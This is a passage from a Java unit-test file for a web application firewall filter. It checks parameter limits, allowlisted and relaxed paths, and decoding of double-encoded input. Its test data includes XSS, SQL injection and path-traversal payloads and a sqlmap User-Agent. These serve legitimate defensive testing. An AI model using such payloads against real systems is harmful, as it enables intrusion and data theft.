            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should continue inspecting params after limit in detect mode")
        void shouldContinueInspectingParams_whenLimitExceededInDetectMode() throws Exception {
            when(mockProps.getProperty("WAF_MODE")).thenReturn("detect");
            when(mockProps.getProperty("WAF_MAX_PARAM_COUNT")).thenReturn("1");
            WafFilter detectFilter = new WafFilter();
            detectFilter.init(mock(FilterConfig.class));

            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("first", "second")));
            when(request.getParameterValues("first")).thenReturn(new String[]{"safe"});
            when(request.getParameterValues("second")).thenReturn(new String[]{"<script>alert(1)</script>"});

            detectFilter.doFilter(request, response, chain);

            verify(request).getParameterValues("second");
            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }

        @Test
        @DisplayName("should pass through on standard path when parameter count is within limit")
        void shouldPassThrough_whenParamCountWithinLimit() throws Exception {
            // 5 params on a standard path — well within the default limit of 100
            java.util.List<String> params = java.util.List.of("a", "b", "c", "d", "e");
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(params));
            for (String p : params) {
                when(request.getParameterValues(p)).thenReturn(new String[]{"safe"});
            }

            filter.doFilter(request, response, chain);

            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }
    }

    // =========================================================================
    // Three-Tier Path Model
    // =========================================================================

    @Nested
    @DisplayName("Three-Tier Path Model")
    class PathModel {

        @Test
        @DisplayName("should skip ALL checks for allowlisted static asset paths")
        void shouldSkipAllChecks_forAllowlistedPath() throws Exception {
            when(request.getRequestURI()).thenReturn("/carlos/images/logo.png");
            // Set up malicious User-Agent — would normally trigger scanner detection
            when(request.getHeader("User-Agent")).thenReturn("sqlmap/1.7.2");

            filter.doFilter(request, response, chain);

            // Allowlist path: WAF entirely skipped
            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }

        @Test
        @DisplayName("should skip ALL checks for /css/ path")
        void shouldSkipAllChecks_forCssPath() throws Exception {
            when(request.getRequestURI()).thenReturn("/carlos/css/main.css");

            filter.doFilter(request, response, chain);

            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }

        @Test
        @DisplayName("should skip injection checks on POST body params for relaxed clinical paths")
        void shouldSkipBodyInjectionChecks_forRelaxedPath() throws Exception {
            when(request.getRequestURI()).thenReturn("/carlos/CaseManagementEntry.do");
            when(request.getMethod()).thenReturn("POST");
            // No query string — param is a POST body param
            when(request.getQueryString()).thenReturn(null);
            // Clinical note with content that would trigger SQLi on a hardened path
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("note")));
            when(request.getParameterValues("note")).thenReturn(
                    new String[]{"UNION of provider services; SELECT relevant medications from list"});

            filter.doFilter(request, response, chain);

            // Relaxed POST: body param injection checks skipped
            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }

        @Test
        @DisplayName("should still check query string params on relaxed paths")
        void shouldCheckQueryStringParams_evenForRelaxedPath() throws Exception {
            when(request.getRequestURI()).thenReturn("/carlos/oscarEncounter/search.do");
            when(request.getMethod()).thenReturn("GET");
            // Malicious value in query string
            when(request.getQueryString()).thenReturn("id=1 UNION SELECT * FROM users");
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("id")));
            when(request.getParameterValues("id")).thenReturn(new String[]{"1 UNION SELECT * FROM users"});

            filter.doFilter(request, response, chain);

            // Relaxed path: query string IS still checked
            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should block TRACE to allowlisted path — protocol enforcement runs before allowlist")
        void shouldBlockTrace_evenForAllowlistedPath() throws Exception {
            // Verifies that TRACE/TRACK method check runs before the allowlist early return,
            // so TRACE to /images/ (which reflects request headers) is still blocked.
            when(request.getRequestURI()).thenReturn("/carlos/images/logo.png");
            when(request.getMethod()).thenReturn("TRACE");

            filter.doFilter(request, response, chain);

            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should not treat path with .do suffix as relaxed when only prefix matches via startsWith")
        void shouldNotRelax_forPathWithDotDoSuffix() throws Exception {
            // /SaveNote.doAdmin must NOT be treated as a relaxed path — only exact /SaveNote.do
            // should be relaxed. This verifies the equals-for-non-slash-terminated fix.
            when(request.getRequestURI()).thenReturn("/carlos/SaveNote.doAdmin");
            when(request.getMethod()).thenReturn("POST");
            when(request.getQueryString()).thenReturn(null);
            when(request.getParameterNames()).thenReturn(
                    Collections.enumeration(java.util.List.of("q")));
            // Payload that would be caught on a normal path but skipped on a relaxed POST
            when(request.getParameterValues("q")).thenReturn(
                    new String[]{"1 UNION SELECT * FROM users"});

            filter.doFilter(request, response, chain);

            // /SaveNote.doAdmin is NOT relaxed — injection check runs and blocks
            verify(response).sendError(anyInt(), anyString());
            verify(chain, never()).doFilter(request, response);
        }

        @Test
        @DisplayName("should not apply hardened limits for path that only shares .do prefix with hardened entry")
        void shouldNotHarden_forPathWithDotDoSuffix() throws Exception {
            // /login.doSomething must NOT inherit hardened limits — only exact /login.do should.
            // Hardened limit is 10 params; default is 100. Send 15 params — should pass on a
            // non-hardened path but would be blocked on a hardened one.
            when(request.getRequestURI()).thenReturn("/carlos/login.doSomething");
            when(request.getMethod()).thenReturn("POST");
            when(request.getQueryString()).thenReturn(null);
            java.util.List<String> paramNames = new java.util.ArrayList<>();
            for (int i = 0; i < 15; i++) {
                paramNames.add("p" + i);
            }
            when(request.getParameterNames()).thenReturn(Collections.enumeration(paramNames));
            for (String pName : paramNames) {
                when(request.getParameterValues(pName)).thenReturn(new String[]{"safevalue"});
            }

            filter.doFilter(request, response, chain);

            // /login.doSomething is NOT hardened — 15 params within the default limit of 100
            verify(chain).doFilter(request, response);
            verify(response, never()).sendError(anyInt(), anyString());
        }
    }

    // =========================================================================
    // Double-Encoding Detection Utility
    // =========================================================================

    @Nested
    @DisplayName("Double-Encoding Detection Utility")
    class DoubleEncoding {

        @Test
        @DisplayName("should decode %252e%252e%252f to ../")
        void shouldDecode_doubleEncodedDotDotSlash() {
            String decoded = WafFilter.decode("%252e%252e%252f");
            assertThat(decoded).isEqualTo("../");
        }

        @Test
        @DisplayName("should decode %2e%2e%2f to ../")
        void shouldDecode_singleEncodedDotDotSlash() {
            String decoded = WafFilter.decode("%2e%2e%2f");
            assertThat(decoded).isEqualTo("../");
        }

        @Test
        @DisplayName("should return safe value unchanged when no encoding is present")
        void shouldReturnUnchanged_whenNoEncoding() {
            String safe = "safe-parameter-value";
            assertThat(WafFilter.decode(safe)).isEqualTo(safe);
        }

        @Test
        @DisplayName("should decode valid escapes when invalid percent escape is present")
        void shouldDecodeValidEscapes_whenInvalidPercentEscapeIsPresent() {
            assertThat(WafFilter.decode("%ZZ%27%20OR%201=1")).isEqualTo("%ZZ' OR 1=1");
        }

        @Test
        @DisplayName("should decode double-encoded valid escapes when invalid percent escape is present")
        void shouldDecodeDoubleEncodedEscapes_whenInvalidPercentEscapeIsPresent() {
            assertThat(WafFilter.decode("%ZZ%253cscript%253e")).isEqualTo("%ZZ<script>");
        }

        @Test
        @DisplayName("should return null when input is null")
        void shouldReturnNull_whenInputIsNull() {
            assertThat(WafFilter.decode(null)).isNull();
        }
    }

    // =========================================================================
    // Query String Parameter Name Parsing
    // =========================================================================

    @Nested
    @DisplayName("Query String Parameter Name Parsing")
    class QueryStringParsing {

        @Test
        @DisplayName("should parse parameter names from a simple query string")
        void shouldParseParamNames_fromSimpleQueryString() {
            java.util.Set<String> names = WafFilter.parseQueryStringParamNames("a=1&b=2&c=3");
            assertThat(names).containsExactlyInAnyOrder("a", "b", "c");
        }

        @Test
        @DisplayName("should return empty set for null query string")
        void shouldReturnEmpty_whenQueryStringIsNull() {
            java.util.Set<String> names = WafFilter.parseQueryStringParamNames(null);
            assertThat(names).isEmpty();
        }

        @Test
        @DisplayName("should return empty set for empty query string")
        void shouldReturnEmpty_whenQueryStringIsEmpty() {
            java.util.Set<String> names = WafFilter.parseQueryStringParamNames("");
            assertThat(names).isEmpty();
        }
    }
}
